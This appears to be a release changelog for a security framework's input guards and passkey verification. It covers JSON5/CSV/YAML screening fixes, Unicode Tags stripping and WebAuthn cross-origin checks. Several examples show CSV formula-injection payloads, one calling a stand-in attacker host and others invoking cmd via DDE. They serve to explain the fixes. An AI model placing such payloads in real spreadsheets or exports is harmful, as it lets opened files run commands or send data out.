`b.guardEmail` (address shape, IP literal, punycode label, SMTP-smuggling verbs, the display-name split, header line splitting), `b.safeMime` (header lines, boundary grammar, quoted-printable, RFC 2047 encoded words, quoted-string unescaping, the Content-Disposition filename parameter), `b.guardShell` (POSIX and cmd.exe metacharacters, `$(`/`${`, `$VAR`, process substitution, line terminators), `b.guardTemplate` (the five engine delimiter pairs and the Velocity directives), `b.guardYaml` (anchors, aliases, the YAML 1.1 boolean quirks, leading-zero octals, merge keys, document separators, duplicate keys), `b.guardUuid` (all four accepted forms), and the four line-protocol guards.

Each conversion ships a test that compares the walk against the pattern it replaced across that guard's corpus, so the equivalence is a checked claim rather than a reading of the diff.

releases.headline: `b.guardJson` no longer refuses a valid document because a string in it contains a URL, and the character-class screens across the guard family are codepoint walks rather than compiled patterns
releases.summary:
A JSON document that carries `"url": "http://example.com/x"` was reported as containing a line comment, and under the `strict` profile that is a refusal. So were a string containing `NaN`, one containing `, }`, one containing a long digit run, and four more shapes: the screens for JSON5 and JSONC syntax looked for characters, and the same characters are syntax outside a string and ordinary text inside one. They are now one string-aware walk, which also finds a real line comment sitting where the old pattern could not see it.

The rest of the release is the same change of technique applied across the guard and safe families: `b.codepointClass`, `b.guardCsv`, `b.guardFilename`, `b.guardDomain`, `b.guardMessageId`, `b.safePath` and `b.safeJsonpath` now screen by walking codepoints against the shared range tables instead of compiling a character class. Doing it turned up four more defects, each fixed here: `b.guardCsv.sanitize` deleted the leading byte-order mark an operator had asked for, its dialect detection could not see a line ending at either end of the document, and `b.safePath` refused a narrower set of bidi characters than every other primitive.

Six scanning primitives are new on `b.codepointClass` for callers building their own screens.

items.title: `b.guardJson` reported JSON5 syntax that was the content of a string
items.body:
The screens for comments, a bare `NaN`, a trailing comma, a single-quoted key, a hex literal and an integer past 2^53 are there because a JSON5 or JSONC parser downstream accepts those forms where `JSON.parse` refuses them. Each was a pattern over the raw source, and a pattern cannot tell a `//` that opens a comment from a `//` in the middle of a URL.

Seven shapes of entirely valid JSON were reported as findings, and under `strict` — where `commentPolicy`, `nanInfinityPolicy`, `trailingCommaPolicy` and `json5SyntaxPolicy` are all `reject` — the document was refused:

- `{"url":"http://example.com/x"}` — read as a line comment
- `{"s":"/* x */"}` — read as a block comment
- `{"s":"the value is NaN here"}` — read as a bare `NaN`
- `{"s":"one, ] two"}` — read as a trailing comma
- `{"s":"set 'key' : value"}` — read as a single-quoted key
- `{"s":"color 0xFF00FF"}` — read as a hex literal
- `{"s":"order 123456789012345678"}` — read as an integer past 2^53

The screens are now a single left-to-right walk that tracks whether it is inside a string literal, and only positions outside one are read as syntax. The same walk closes the other half of the defect: a line comment immediately after a string value (`{"a":"b"// c`) was invisible, because the pattern required a non-quote character in front of the slashes.

items.title: `b.guardJson` did not see a number that overflows to Infinity
items.body:
`nanInfinityPolicy` refuses a document carrying a non-finite value, and it looked for the words — `NaN`, `Infinity`, `undefined`. A magnitude no double can hold reaches the consumer as `Infinity` just the same: `{"a":1e123456789012345678}` and `{"a":1.8e308}` both parse to it, and both validated clean under `strict`.

Each numeric literal is now weighed rather than measured by digit count — there is no digit count that separates `1e308` from `1e309` — and one that lands outside the double range is reported as `nan-infinity`. The sign is read separately from the magnitude, so a negative JSON5 hex literal is not mistaken for one.

items.title: `b.guardCsv.sanitize` removed the leading byte-order mark under `bomPrefix: true`
items.body:
`bomPrefix: true` states that the document opens with a BOM — the byte that makes Excel read the file as UTF-8. `validate` honors it and flags a leading BOM only when the option is false. `sanitize` removed every BOM regardless, so a document that validated clean came back without the byte the operator had asked for.

The leading BOM now survives when the option is set. A BOM anywhere else is still removed; that one is the mid-stream artifact `validate` flags either way.

items.title: `b.guardCsv.detect` misread a document whose first or last line ending was bare
items.body:
Counting CRLF, bare LF and bare CR needed a character on both sides of the terminator, so a document opening with a bare LF or closing with a bare CR was counted as having none of that kind. `detect` then reported CRLF as the dominant ending for a document that used LF, and `dialectPolicy: "strict"` did not flag the mixed endings it exists to flag.

One walk now classifies every terminator, counting a CRLF once rather than as a CR and an LF.

items.title: `b.safePath` refused a narrower set of bidi characters than the rest of the framework
items.body:
It carried its own copy of the bidi-override table, and the copy was missing the Arabic letter mark (U+061C). It reads from the shared catalog now, so it refuses the same set as every other primitive.

The same file's Windows reserved-name, encoded-separator, drive-prefix and UNC-prefix checks are character walks over explicit tables for the same reason: a local copy of a table drifts from the shared one the moment a codepoint is added to one and not the other.

items.title: Six scanning primitives on `b.codepointClass`
items.body:
For building a screen over a character class without compiling a pattern for it:

- `replaceRanges(text, ranges, replacement)` — every codepoint in the table replaced. One replacement per codepoint, so a character above U+FFFF becomes one rather than one per surrogate.
- `indexOfAny(text, chars, from?)` — index of the first character drawn from a set, or `-1`. The set is a plain string with no pattern syntax in it, so a `]` or a `-` in it needs no escaping.
- `replaceAny(text, chars, replacement)` — every character from a set replaced, not the first.
- `trimChars(text, chars, opts?)` and `trimRanges(text, ranges, opts?)` — a leading and trailing run removed; `opts.leading` / `opts.trailing` restrict it to one end.
- `containsFolded(haystack, needle)` — substring search that ignores ASCII case and leaves non-ASCII alone, so an index into the subject still refers to the same place in it.

`WHITESPACE_RANGES` ships alongside them: exactly what a regular expression means by `\s`, which is much wider than the ASCII five. A filename ending in U+00A0 is trimmed by Windows on create, so a screen that trims only space and tab passes a name that becomes a different name on disk.

items.title: Vendored `@blamejs/pki` moves to 0.5.5
items.body:
The toolkit behind `b.mtlsCa`, `b.auth.passkey` and the TLS certificate paths. 0.5.5 makes each of its verdicts follow the bytes the parser read: a certificate or CRL assembled by a caller rather than parsed is refused, and the signature checks in `ocsp.verify`, `path.verifyOcspResponse` and the PKCS#12 verbs re-derive the signed range from the parser's own record instead of reading it back off the object — a parsed certificate presents the signed range, the signature and every field it encodes as separate properties, so substituting one leaves a chain that verifies against a key its CA never held. It also holds both accepted forms of a stored WebAuthn credential key to the same rules, reads `keyUsage` per X.690 §11.2.2 at every boundary that asks what a certificate may do, and folds only the four ASCII whitespace characters X.520's `caseIgnoreMatch` names when comparing distinguished names.

One change is visible from outside: the package now declares an entry point, so `require("@blamejs/pki/lib/...")` no longer resolves. `require("@blamejs/pki")` is unchanged, which is the only form the framework uses. If you call the toolkit directly and reach into its internals, its `MIGRATING.md` carries the route to the equivalent `pki.*` surface.

items.title: The compiled character-class exports on `b.codepointClass` are gone
items.body:
`BIDI_RE`, `BIDI_RE_G`, `C0_CTRL_RE`, `C0_CTRL_RE_G`, `ZERO_WIDTH_RE`, `ZW_RE_G`, `NULL_RE_G`, `TAG_RE` and `TAG_RE_G` are removed. The range tables they were built from — `BIDI_RANGES`, `C0_CTRL_RANGES`, `ZERO_WIDTH_RANGES`, `TAG_RANGES`, and now `NULL_RANGES` — are the surface, scanned with `inRanges` / `firstInRanges` / `stripRanges` / `replaceRanges`.

If you consumed one of the compiled forms, the replacement is direct: `BIDI_RE.test(s)` becomes `firstInRanges(s, BIDI_RANGES) !== -1`, and `s.replace(ZW_RE_G, "")` becomes `stripRanges(s, ZERO_WIDTH_RANGES)`. `charClass(ranges)` still builds a class body for a caller assembling a pattern of its own.

Two failures drove this. `charClass` emitted a four-digit escape for a codepoint above U+FFFF, which re-parses into a range matching nearly every character — so the compiled Unicode Tags class was wrong in the direction that matches too much. And a global pattern carries a cursor between calls, which is how a `validate` answered differently on the second call than the first.

releases.headline: A guard's `sanitize` no longer hands back a threat it was told to refuse, and the CSV formula mitigation is emitted in the form that actually disarms it
releases.summary:
Every content guard takes a policy per character class: `reject` refuses the input, `strip` removes the character, `audit` reports it and leaves the text alone. The strip table only ever removed the classes set to `strip`, so a class set to `reject` fell between the two — not refused, not repaired, returned to the caller unchanged with no error. `b.guardText.sanitize` and `b.guardCsv.sanitize` did this for every class under the `strict` profile, and `b.guardEmail.sanitize` did it for C0 controls. The stricter the profile, the weaker the function.

The same pass fixes four defects in the CSV formula-injection mitigation. The largest: the scan for a cell beginning with `=`, `+`, `-` or `@` anchored on the start of the input, so the first column of every row after the header was never examined.

Upgrading is enough for all of it. `sanitize` now throws where it used to return a threat, so a caller that passes hostile input under a `reject` policy and ignores exceptions will see one it did not see before — that is the fix, and the profiles that repair rather than refuse are unchanged.

items.title: `sanitize` refuses a character class set to `reject` instead of returning it
items.body:
`applyCharStripPolicies` removes only the classes an operator set to `strip`. A guard whose `sanitize` also never refuses therefore had no branch at all for `reject`: the bidi override, C0 control, null byte, zero-width or Unicode Tags character was neither removed nor rejected, and the call returned it with no error.

`b.guardText.sanitize` did this for all five classes under `strict`, where every class is set to `reject`. `b.guardCsv.sanitize` did it for four. `b.guardEmail.sanitize` refused only findings scored critical, and a C0 control scores high, so it passed one through as well.

The `gate` decision chain was never affected — it routes a reject-policy finding to `refuse` before `sanitize` is reached. The exposure was the standalone `sanitize` call.

A new primitive owns the ordering so it cannot be composed wrongly: `b.codepointClass.scrubCharThreats(text, opts, errorFactory, codePrefix)` refuses the `reject` classes, strips the `strip` classes, and returns the cleaned string. `b.guardHtml`, `b.guardSvg` and `b.guardText` route through it.

items.title: Unicode Tags characters are now stripped across the content guards, not just `b.guardText`
items.body:
The Tags block (U+E0000-E007F) renders as nothing in every editor and viewer, which is what makes it a channel for carrying one value in text that reads as another. `b.guardText` was the only guard that named a policy for it; `b.guardHtml`, `b.guardSvg`, `b.guardJson`, `b.guardYaml`, `b.guardXml`, `b.guardMarkdown`, `b.guardEmail` and `b.guardCsv` had no handling at all.

A guard that sets `zeroWidthPolicy` and no `tagsPolicy` now applies the former to both, in `validate` as well as in the sanitize path. An explicit `tagsPolicy` still wins. `b.guardCsv`, which exposes neither option, strips Tags characters unconditionally alongside zero-width.

Reporting matters as much as stripping here: a content gate validates first and sanitizes only once validation has found something, so a class that was stripped but never reported was stripped only by a direct `sanitize` call. Through the gate the document validated clean and was served with the character intact.

The gate action follows that same policy rather than the finding's severity. A class the sanitizer can remove is removed and the document served; only a `reject` policy refuses. Without that, every guard refused any document carrying a Tags character at every profile — including `permissive` — for a class its own sanitizer would have stripped.

**This changes what an existing deployment does with one input.** The tag sequences in subdivision flag emoji — the Scotland, Wales and England flags — are Tags characters, and every guard now acts on them where only `b.guardText` did before. Where the guard's gate has a sanitize step and the policy is `strip`, the sequence is removed and the content served — which leaves the base flag character and loses the subdivision. Where the policy is `reject`, or the guard maps severity straight to a disposition with no repair step (`b.guardEmail`, `b.guardYaml`), the document is refused. If you accept user content carrying those flags, set `tagsPolicy: "allow"` on that route, or `zeroWidthPolicy: "allow"` to let both invisible classes through. Nothing distinguishes a flag sequence from a smuggled instruction by the characters alone, so that call is yours per route.

items.title: A CSV formula in the first column of a row was never scanned
items.body:
`b.guardCsv.validate` looked for a cell beginning with a formula trigger at the start of the input or immediately after a delimiter. A cell that opens a row follows the row separator rather than a delimiter, so with a header row present the entire first column of the data went unexamined — `header\r\n=WEBSERVICE("https://attacker.example")` returned no findings.

The scan now walks cell boundaries directly, including the position after a run of line terminators. It is also quote-aware, which the previous form could not express: a blank row is no longer read as an injected formula, and a document that is only line endings is no longer a critical finding.

items.title: The `allowlist` formula policy passed through anything it could not identify
items.body:
`formulaInjectionPolicy: "allowlist"` is documented to let named-safe functions such as `SUM` and `AVERAGE` through unprefixed. It applied the prefix only when its matcher recognized a leading function name, so a value that did not parse as a function call — `=cmd|'/c calc'!A0`, `=2+3`, a trigger followed by nothing word-like — took no mitigation at all.

Only a cell positively identified as an allowlisted call now passes unprefixed. The comparison is case-insensitive, because spreadsheet function names are: `=sum(A1)` and `=SUM(A1)` are the same call, and a case-sensitive table was a filter to spell around.

items.title: The formula prefix is emitted inside the quoted field
items.body:
OWASP's Excel-resistant mitigation is a TAB placed inside the quoted field. The prefix was applied to the cell value but the field was quoted only when it contained a delimiter, a quote, CR or LF — so a mitigated cell was usually emitted bare. Unquoted, a leading TAB is a delimiter under tab-separated import and is dropped by consumers that trim leading whitespace from unquoted fields, either of which puts the trigger character back at the front of the cell.

`b.guardCsv.serialize` now emits quoted fields for any document in which the mitigation fired. A table that carries no formula trigger is emitted exactly as before — quoting every export unconditionally would add roughly a third to its size, which for a large one is the difference between fitting under `maxTotalBytes` and being refused.

This also gives `wrap-with-quotes-and-prefix` the behavior its name describes; it had been byte-identical to `prefix-quote`.

If you emit CSV through your own writer using `b.guardCsv.escapeCell`, quote the value it returns.

items.title: Vendored `@blamejs/pki` moves to 0.5.4
items.body:
The toolkit behind `b.mtlsCa`, `b.auth.passkey` and the TLS certificate paths. 0.5.4 tightens what a CRL is allowed to answer: `crl.verify` now checks that the certificate handed to it is the issuer the CRL names and that its `keyUsage` asserts `cRLSign`, and `crl.isRevoked` refuses a CRL whose scope does not cover the serial it was asked about — a delta CRL read alone, an indirect CRL, or one narrowed by an issuing distribution point. Each of those previously returned an answer that could be the opposite of the truth. `path.validate` reports whether revocation was ever established rather than conflating "checked and good" with "could not check, and you waived it", and a trust anchor's purpose-scoped `distrustAfter` and `purposes` metadata now applies instead of sitting inert.

No change is required here: the framework calls the CRL signing side, and its own revocation lookups run against its own store rather than through these verbs. The tightening matters if you call `@blamejs/pki` directly — its changelog has the detail.

items.title: New `b.codepointClass.assertWithinMaxBytes`
items.body:
Throws `<codePrefix>.too-large` when the input exceeds `opts.maxBytes` UTF-8 bytes; a no-op when no ceiling is set. This is the bound that `assertNoCharThreats` and `detectCharThreats` expect a caller to have applied — their scans are unbounded, so on untrusted input the size refusal has to come first. `scrubCharThreats` applies it for you.

It is a separate call rather than part of those functions on purpose: a guard that already refuses or repairs an oversized input under its own rule keeps its own error. `b.guardFilename` reports `filename.length` for a name past its cap, and a shared ceiling firing first would have replaced that with an unrelated code.

items.title: `prefix-tab` stacked a second TAB on an already-escaped cell
items.body: TAB is both the mitigation prefix and one of the characters that triggers the mitigation, so escaping a value that `escapeCell` had already returned prefixed it again. Escaping is now a fixed point: a pipeline that escapes twice produces the same bytes as one that escapes once.

items.title: `b.guardYaml.validate` reported a leading-zero octal on every other call
items.body:
The scan for a leading-zero numeric — the value YAML 1.1 reads as octal — used a global regular expression, which carries its position between calls. `.test()` resumed from wherever the previous call stopped, so the same document answered yes, then no, then yes: the finding was reported on roughly half of invocations, and nothing about the input said which answer you got. A guard that detects a rule when you try it and misses it in production is worse than one that never detected it. Present since the rule shipped.

The guard registry test now drives every guard's `validate` repeatedly on the same input and requires an identical verdict, so a scan that carries state between calls fails the suite wherever it is introduced.

items.title: The CSV cell scan ignored a configured `quote` or `delimiter`
items.body:
The scan treats every common delimiter as a cell boundary, whatever the configured one, because a document is only as safe as the way a recipient opens it — a spreadsheet asked to import the same bytes as semicolon-separated splits on semicolons regardless of what the producer intended. What it flags on that basis, the gate must be able to act on: `b.guardCsv.gate` now refuses a formula it cannot disarm without rewriting the document for a dialect it is not emitting, rather than reporting `sanitize` and returning the payload untouched. A formula in a cell of the configured dialect is still repaired.

Both scans located cell boundaries using the default quote and a fixed set of delimiters rather than the dialect in the options.

With `quote` set to anything else, an ordinary double quote in the data was read as opening a quoted field; the scan then looked for a closing quote that never came and ran to the end of the input, so no later cell was examined at all. `{ delimiter: ",", quote: "'" }` over `"ordinary,=2+3` reported nothing and the gate served it unchanged.

A configured `delimiter` outside the recognized set had the same effect at every boundary it marked: under `delimiter: ":"`, `a:=cmd|x` was not reported. Both scans now take the configured quote and add the configured delimiter to the boundaries they recognize.

items.title: `b.csv` lost a row consisting of a single empty cell
items.body: Two halves of the same round-trip. `b.csv.parse` dropped a final record made of a quoted empty field — nothing accumulates for one, so the end-of-input check could not tell it apart from having already consumed a line ending, and `"a"\r\n""` returned one row instead of two. `b.csv.stringify` emitted such a row bare, which makes it an empty line that the reader cannot distinguish from the terminator of the row before it; it is now quoted so the record has a body. A row with more than one cell keeps its delimiters and is unchanged.

items.title: `char-threat-strip-without-the-reject-assert`
items.body: Refuses a sanitize path that strips character-class threats without first refusing the classes set to `reject` — the shape behind three of the fixes above. Guards that expose their own policy vocabulary assert under it and are listed explicitly.

items.title: A guard's `sanitize` is checked against every threat class it registers
items.body: The guard registry test now walks every registered content guard and asserts that `sanitize` under `strict` either refuses or removes each character-class threat, never returning it. It reads the live registry, so a guard added later is covered from the day it registers.

releases.headline: Passkey verification moves onto the PKI toolkit the framework already ships, the `@simplewebauthn/server` bundle is gone, and the ceremony now refuses cross-origin registrations and logins
releases.summary:
`b.auth.passkey` verified WebAuthn attestations and assertions through a second vendored library. `@blamejs/pki` — already in the tarball for `b.mtlsCa` — does the same job, so the 889 KB `@simplewebauthn/server` bundle no longer ships. One fewer third-party bundle to track advisories against, and no new dependency to replace it.

The surface is deliberately unchanged: the same four calls, the same options, the same result fields, and the same stored-credential bytes, so existing credential rows keep working and no migration is needed.

What is new is a check the previous verifier never made. `CollectedClientData.crossOrigin` says whether the ceremony ran inside an iframe rather than at the top level, and nothing read it — a registration or login driven from a hostile embedding page was indistinguishable from one the user performed on your site, because the signature, challenge, origin and RP ID all genuinely check out. Both ceremonies now refuse it.

One behaviour narrows in a way that can need action: the verifier accepts the three algorithms the framework advertises, where the previous one advertised three and accepted ten. If your deployment issued credentials outside that set, name them in `allowedAlgorithms` — details below.

items.title: Cross-origin ceremonies are refused by default
items.body:
`CollectedClientData` carries a `crossOrigin` flag, set by the browser when WebAuthn ran in a frame whose top-level origin is not yours. The previous verifier never read it.

That leaves an embedded ceremony looking exactly like a legitimate one: the credential really was used at your origin — inside somebody else's page, driven by their script, at a moment the user did not choose. The user sees their own authenticator prompt and approves it.

`verifyRegistration` and `verifyAuthentication` now refuse `crossOrigin: true` with `auth-passkey/cross-origin-ceremony`.

A deployment that genuinely is embedded — a checkout widget, a partner portal — names the embedders it has:

```js
allowCrossOrigin: ["https://partner.example"]   // matched against clientData.topOrigin
```

`allowCrossOrigin: true` accepts any embedder, for the case where the partner set is not a list you can write down. A browser that reports `crossOrigin` without naming the top origin never satisfies a list — an unnamed embedder is the case the list exists to exclude.

items.title: Manufacturer attestations are anchored to pinned vendor roots
items.body:
An `apple` or `android-key` attestation statement proves which authenticator model created a credential — which is the entire reason to ask for `attestation: "direct"`. That proof is only worth its anchor: checking the statement's signature and certificate profile without checking WHERE the chain terminates accepts a manufacturer claim rooted in a CA the attacker created.

The six vendor roots (Apple's WebAuthn root, Google's four hardware-attestation roots, and the GlobalSign root the SafetyNet JWS chains to) are pinned in the framework and handed to the verifier, rather than read from the host trust store — the store is operator-mutable and carries hundreds of unrelated roots, any one of which could otherwise mint an "Apple" authenticator. `android-safetynet` registrations are verified again rather than refused as an unsupported format, and with the two checks that make one worth having: Google's `ctsProfileMatch` must be true (a correctly-signed statement that the device FAILED compatibility testing is still a failure), and the response must be less than 60 seconds old and not dated in the future. A device-integrity claim is about a moment; without an age bound, one captured response replays for as long as the challenge stays outstanding. `requireCtsProfileMatch: false` and `safetyNetMaxAgeMs` move those.

Anchors are chosen per format: `apple` chains to Apple's root, `android-key` to Google's, `android-safetynet` to GlobalSign. A `compound` statement (WebAuthn 8.9) nests several attestations, each with its own trust path, and is refused rather than anchored off its outer format alone — which would leave a nested manufacturer element unanchored. The verifier this replaces did not implement `compound` either, so nothing that worked before stops working. `packed`, `tpm` and `fido-u2f` are deliberately not anchored against this bundle — those chains end at whichever vendor made the key, so there is no fixed set to pin, and WebAuthn anchors them through the FIDO metadata entry for the credential's AAGUID instead (`b.auth.fidoMds3`). `none` and self attestation carry no chain at all and are unaffected.

A deployment that trusts a different set passes `attestationRoots` (and `safetyNetRoots`). An explicit override applies to EVERY attestation carrying a certificate chain, including `packed`, `tpm` and `fido-u2f` — a deployment naming anchors for its own authenticators is asking for that chain to be checked, and skipping it because the framework ships no default for that format would leave the verifier accepting any chain an attacker minted while the operator believed otherwise. The override REPLACES the format's pinned set rather than extending it — naming your own anchors is narrowing trust, and quietly adding the vendor roots back would defeat that. An empty or malformed override is refused rather than falling back to the default.

items.title: Binary response fields must be canonical base64url
items.body:
`authenticatorData`, `signature`, `clientDataJSON` and `attestationObject` are now required to be canonical base64url. Node's decoder discards characters it does not recognise, so `AQ!ID` and `A Q I D` decode to the same bytes as `AQID` — the verifier saw the genuine signed bytes and returned `verified: true` while the response as posted had unboundedly many spellings.

That matters beyond tidiness: anything keyed on the response as sent — a replay cache, an idempotency key, a request digest — counts each spelling as a new request.

`expectedChallenge` is held to the same rule, because it is decoded the same way: a stored challenge corrupted to `AQ!ID` compares equal to `AQID`, so a response would verify against a challenge that was not the one held. Challenges minted by `startRegistration` / `startAuthentication` are already canonical; this catches a session store that mangled the value, or a caller building ceremonies itself.

items.title: A response must state the one credential type WebAuthn defines
items.body:
WebAuthn has exactly one credential type, `"public-key"`. A registration or assertion whose outer `type` is missing or altered is now refused with `auth-passkey/bad-credential-type`, rather than the value being defaulted into `registrationInfo.credentialType`.

Writing a type nothing verified into a credential row misleads anything that later dispatches on it, and storing the attacker's string does so more directly.

items.title: `requireAttestationAnchor` for relying parties that act on attestation provenance
items.body:
A `packed`, `tpm` or `fido-u2f` attestation chains to whichever vendor made the key. WebAuthn anchors those through the FIDO metadata entry for the credential's AAGUID rather than a fixed root list, so a verifier with no metadata wired in accepts a chain that terminates anywhere — including a CA the attacker created — and the AAGUID in the statement is a claim rather than a verified fact.

That is unchanged here and is what the verifier this release replaces does too; refusing such chains by default would reject every ordinary security key. What the result tells you is `registrationInfo.anchoredTo`: the root the chain reached, or nothing.

A relying party that makes decisions on attestation provenance can now require it:

```js
await b.auth.passkey.verifyRegistration({
  response, expectedChallenge, expectedOrigin, expectedRPID,
  requireAttestationAnchor: true,          // refuse a chain that anchored at nothing
  attestationRoots: [ /* this deployment's authenticator roots */ ],
});
```

Without `attestationRoots`, pair it with an AAGUID check against FIDO metadata via `b.auth.fidoMds3`. The option does not fire on `none` or self attestation, which carry no chain to anchor.

items.title: Both spellings of the credential ID are bound to the credential being used
items.body:
A WebAuthn response states its credential ID twice — `id` and its binary spelling `rawId` — and neither is covered by any signature. Registration checks both against the ID inside the attestation, which the authenticator signs; authentication checks both against the stored record.

A response stating NEITHER is refused with `auth-passkey/missing-credential-id`: tolerating one missing spelling is compatibility, but tolerating both means the binding compares nothing, and WebAuthn requires the outer identifier.

The mismatch case is not what admits an attacker — a mismatched record carries the wrong public key, so the signature fails regardless. It is about what an operator is told when it happens. An application that looks a credential up by user rather than by asserted ID could pair a valid key with the wrong row and see only an opaque signature failure; it now gets `auth-passkey/credential-id-mismatch`, which names the actual problem.

items.title: The FIDO metadata trust root is pinned in the source
items.body:
`b.auth.fidoMds3` anchored MDS3 BLOB chains to a GlobalSign Root CA - R3 certificate read out of the removed bundle. That certificate is now a constant in the framework, and a test asserts its subject, self-signature, validity window and SHA-256 fingerprint — so substituting it during a refactor fails a gate instead of silently widening what can sign a metadata BLOB.

The `caCertificate` override is unchanged, and still replaces the pinned root rather than adding to it.

items.title: Verified algorithms are the advertised ones — widen with `allowedAlgorithms` if you issued others
items.body:
`startRegistration` has always offered Ed25519, ES256 and RS256. The verifier behind it accepted ten algorithms, including RSA with SHA-1. It now accepts exactly what is offered.

An authenticator is supposed to pick from the advertised list, so for most deployments nothing changes. But the wider set was accepted for as long as it was offered, so a credential registered outside it may exist — and refusing its assertions locks that user out of an account they can still prove they own.

`allowedAlgorithms` names the set for a call, and drives both halves of a ceremony: what `startRegistration` offers and what the verifiers enforce, so a deployment cannot advertise one set and accept another.

```js
await b.auth.passkey.verifyAuthentication({
  response, expectedChallenge, expectedOrigin, expectedRPID, credential,
  allowedAlgorithms: [-8, -7, -257, -36],   // + ES512, for credentials issued earlier
});
```

Supported identifiers are -8, -7, -35, -36, -37, -38, -39, -257, -258, -259 — every one of them exercised end to end, so the list cannot advertise an algorithm the verifier would then refuse. The default is unchanged and the option applies only to the call it is passed to. RSA with SHA-1 (-65535) is refused however it is asked for: the option exists to keep working credentials working, not to make a broken primitive reachable through configuration, and a credential using it has to be re-registered. An unsupported identifier, a non-integer, or an empty list is refused at the call rather than falling back to the default.

If you are unsure which algorithms your table holds, the COSE key's `alg` (label 3) in each stored `credential.publicKey` is the answer.

`b.breakGlass` forwards the option too. Its passkey factor accepts `allowedAlgorithms` (and `allowCrossOrigin`) and passes them to the ceremony — without that, a break-glass credential enrolled under a wider algorithm set would be refused with no way to say otherwise, on the one path an operator reaches for when every other has already failed.

items.title: `@simplewebauthn/server` is no longer vendored
items.body:
Attestation and assertion verification, CBOR parsing, COSE key handling and signature checking now run in `@blamejs/pki`, which the framework already vendors. Nothing about `b.auth.passkey`'s API changes: the same calls, options, result fields, and stored-credential format — the persisted public key is the authenticator's COSE key bytes verbatim, as before.

The ceremony options `startRegistration` and `startAuthentication` return are now built in the framework rather than delegated. They are plain JSON documents the browser reads, with no secret in them beyond the challenge, and the challenge comes from `b.crypto.generateBytes` like every other secret the framework mints.

`registrationInfo.credential.publicKey` is now a `Buffer` rather than a bare `Uint8Array`. A `Buffer` is a `Uint8Array`, the bytes are identical, and code that stores or compares it is unaffected.

items.title: A credential key stored as base64url text is read as base64url
items.body:
`credential.publicKey` may now be handed back as a `Buffer`, a `Uint8Array`, or the base64url string an operator wrote to a TEXT column. Previously a string was neither decoded nor rejected — it was read as UTF-8, producing bytes that are not a COSE key, and the login failed with a message about a malformed credential while the stored row was perfectly intact.

A string that is not canonical base64url, and any other type, is now refused as `auth-passkey/bad-credential-key` rather than coerced into bytes that merely happen to parse. Correct `=` padding is accepted and matters here more than anywhere: a COSE key's length usually calls for it — an ES256 key is 77 bytes, 103 characters plus one `=`.

items.title: A bad attestation signature is a negative result, not an exception
items.body:
